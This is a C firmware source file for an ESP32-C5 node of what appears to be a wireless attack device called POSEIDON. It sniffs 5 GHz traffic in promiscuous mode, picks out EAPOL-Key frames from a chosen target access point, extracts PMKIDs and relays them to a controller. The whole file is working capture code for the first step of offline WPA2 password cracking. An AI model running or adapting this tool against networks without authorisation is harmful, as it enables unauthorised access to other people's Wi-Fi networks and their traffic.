/*
 * pmkid_capture.c — passive PMKID capture on the ESP32-C5.
 *
 * The S3 side of POSEIDON cannot physically receive on 5 GHz. Only
 * this C5 node can. When POSEIDON sends CMD_PMKID with a target BSSID
 * + 5 GHz channel, we:
 *
 *   1. Disable HELLOs (radio-lock for promisc RX)
 *   2. Lock to the channel requested
 *   3. Enable promiscuous mode with a WPA2/EAPOL filter
 *   4. Parse EAPOL-Key M1 frames for a PMKID KDE in the key-data
 *   5. Stream RESP_PMKID back to the S3 for every unique capture
 *   6. Run until duration expires
 *
 * PMKID KDE format (IEEE 802.11-2016 § 12.7.2):
 *   Key-Data inside EAPOL Key frame contains TLVs with OUI-selector:
 *     type=0xDD len=0x14 oui=00:0F:AC subtype=0x04 pmkid[16]
 *
 * We only capture from M1 of the 4-way (the first key frame after
 * (re)association) because:
 *   - PMKID appears there when the AP has it cached (PSK, RSN)
 *   - No re-capture churn if the client is actively rekeying
 */
#include "proto.h"
#include "led_fx.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_now.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>
#include <stdlib.h>

static const char *TAG = "pmkid";

extern volatile bool g_pause_hello;

struct pmkid_ctx_t {
    uint8_t  requester[6];
    uint16_t seq;
    uint8_t  target_bssid[6];
    uint8_t  channel;
    uint16_t duration_ms;
    volatile bool stop;
};

static struct pmkid_ctx_t *s_ctx = NULL;

/* Dedup ring — same (bssid,sta,pmkid) tuple shouldn't fire twice in a
 * single capture session. 16 entries is generous; on a live AP you
 * rarely see more than 4 distinct clients roll handshakes in a burst. */
struct seen_t { uint8_t sta[6]; uint8_t pmkid[16]; };
#define SEEN_N 16
static struct seen_t s_seen[SEEN_N];
static int s_seen_n = 0;

static bool already_seen(const uint8_t sta[6], const uint8_t pmkid[16])
{
    for (int i = 0; i < s_seen_n; ++i) {
        if (memcmp(s_seen[i].sta, sta, 6) == 0 &&
            memcmp(s_seen[i].pmkid, pmkid, 16) == 0) return true;
    }
    if (s_seen_n < SEEN_N) {
        memcpy(s_seen[s_seen_n].sta, sta, 6);
        memcpy(s_seen[s_seen_n].pmkid, pmkid, 16);
        s_seen_n++;
    }
    return false;
}

/* Scan the encoded key-data for the PMKID KDE. Returns true + fills
 * out[16] if found. */
static bool extract_pmkid_kde(const uint8_t *kd, int kd_len, uint8_t out[16])
{
    int i = 0;
    while (i + 2 <= kd_len) {
        uint8_t type = kd[i];
        uint8_t len  = kd[i + 1];
        if (i + 2 + len > kd_len) break;
        /* Vendor-specific KDE: type 0xDD, len >= 20, OUI 00:0F:AC, subtype 0x04 */
        if (type == 0xDD && len >= 20 &&
            kd[i + 2] == 0x00 && kd[i + 3] == 0x0F && kd[i + 4] == 0xAC &&
            kd[i + 5] == 0x04) {
            memcpy(out, &kd[i + 6], 16);
            return true;
        }
        i += 2 + len;
    }
    return false;
}

static void emit_pmkid(const uint8_t bssid[6], const uint8_t sta[6],
                       const uint8_t pmkid[16])
{
    if (!s_ctx) return;
    if (already_seen(sta, pmkid)) return;

    posei_msg_t out;
    memset(&out, 0, sizeof(out));
    out.magic   = POSEI_MAGIC;
    out.version = POSEI_VERSION;
    out.type    = POSEI_TYPE_RESP_PMKID;
    out.seq     = s_ctx->seq;

    posei_pmkid_t *p = (posei_pmkid_t *)out.payload;
    memcpy(p->bssid, bssid, 6);
    memcpy(p->sta,   sta,   6);
    memcpy(p->pmkid, pmkid, 16);
    p->ssid_len = 0;        /* SSID requires beacon cross-ref; leave empty */
    p->ssid[0]  = '\0';

    out.payload_len = sizeof(posei_pmkid_t);
    esp_now_send(s_ctx->requester, (const uint8_t *)&out, sizeof(out));

    ESP_LOGI(TAG, "PMKID %02x%02x%02x%02x%02x%02x <- %02x:%02x:%02x:%02x:%02x:%02x",
             pmkid[0], pmkid[1], pmkid[2], pmkid[3], pmkid[4], pmkid[5],
             sta[0], sta[1], sta[2], sta[3], sta[4], sta[5]);
}

/* Promiscuous callback — runs at high priority; keep it tight. */
static void IRAM_ATTR promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (!s_ctx || s_ctx->stop) return;
    if (type != WIFI_PKT_DATA) return;

    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *p = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 32) return;

    /* 802.11 data frame header min 24 bytes. FC[0]=0x08 data. */
    if ((p[0] & 0x0C) != 0x08) return;

    /* Extract addr1 (RA), addr2 (TA), addr3 (BSSID) based on ToDS/FromDS. */
    uint8_t tods   = p[1] & 0x01;
    uint8_t fromds = p[1] & 0x02;
    const uint8_t *bssid;
    const uint8_t *sta;
    if (tods && !fromds)      { bssid = &p[4];  sta = &p[10]; }
    else if (!tods && fromds) { bssid = &p[10]; sta = &p[4];  }
    else                        return;  /* ignore IBSS / WDS here */

    if (memcmp(bssid, s_ctx->target_bssid, 6) != 0) return;

    /* After 24-byte header is QoS (2B if subtype has QoS) then LLC.
     * Subtype bits 4-7 of FC[0]. Subtype 8 (0x88) = QoS data. */
    int hdr = 24;
    if ((p[0] & 0x80)) hdr += 2;

    /* LLC SNAP: AA AA 03 00 00 00 88 8E = EAPOL */
    if (len < hdr + 8) return;
    if (!(p[hdr + 0] == 0xAA && p[hdr + 1] == 0xAA && p[hdr + 2] == 0x03 &&
          p[hdr + 6] == 0x88 && p[hdr + 7] == 0x8E)) return;

    /* EAPOL header: version, type, length_h, length_l, then body. */
    int eapol = hdr + 8;
    if (len < eapol + 4) return;
    if (p[eapol + 1] != 0x03) return;   /* EAPOL-Key only */

    /* Key frame starts at eapol + 4. Offsets (IEEE 802.11-2016 §12.7.2): */
    const uint8_t *key = p + eapol + 4;
    int klen = len - (eapol + 4);
    if (klen < 95) return;

    /* Key-Data-Length at offset 93-94 (big-endian), Key-Data follows. */
    int kd_len = (key[93] << 8) | key[94];
    if (kd_len <= 0 || 95 + kd_len > klen) return;

    uint8_t pmkid[16];
    if (extract_pmkid_kde(key + 95, kd_len, pmkid)) {
        emit_pmkid(bssid, sta, pmkid);
    }
}

static void pmkid_task(void *arg)
{
    struct pmkid_ctx_t *ctx = (struct pmkid_ctx_t *)arg;
    s_ctx = ctx;
    s_seen_n = 0;

    led_fx_set(LED_MODE_SCAN);
    g_pause_hello = true;

    ESP_LOGI(TAG, "PMKID capture ch=%u dur=%ums bssid=%02x:%02x:%02x:%02x:%02x:%02x",
             ctx->channel, ctx->duration_ms,
             ctx->target_bssid[0], ctx->target_bssid[1], ctx->target_bssid[2],
             ctx->target_bssid[3], ctx->target_bssid[4], ctx->target_bssid[5]);

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_channel(ctx->channel, WIFI_SECOND_CHAN_NONE);
    wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(promisc_cb);
    esp_wifi_set_promiscuous(true);

    uint32_t end = xTaskGetTickCount() + pdMS_TO_TICKS(ctx->duration_ms);
    while (!ctx->stop && xTaskGetTickCount() < end) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    /* Restore ch 1 so subsequent HELLOs reach POSEIDON. */
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    s_ctx = NULL;
    led_fx_set(LED_MODE_IDLE);
    g_pause_hello = false;

    free(ctx);
    vTaskDelete(NULL);
}

void pmkid_capture_start(const uint8_t requester[6],
                         const posei_pmkid_req_t *req,
                         uint16_t seq)
{
    if (s_ctx) { s_ctx->stop = true; vTaskDelay(pdMS_TO_TICKS(120)); }

    struct pmkid_ctx_t *ctx = malloc(sizeof(*ctx));
    if (!ctx) return;
    memcpy(ctx->requester, requester, 6);
    ctx->seq          = seq;
    memcpy(ctx->target_bssid, req->bssid, 6);
    ctx->channel      = req->channel;
    ctx->duration_ms  = req->duration_ms ? req->duration_ms : 15000;
    ctx->stop         = false;

    xTaskCreate(pmkid_task, "pmkid", 4096, ctx, 4, NULL);
}

void pmkid_capture_stop(void)
{
    if (s_ctx) s_ctx->stop = true;
}
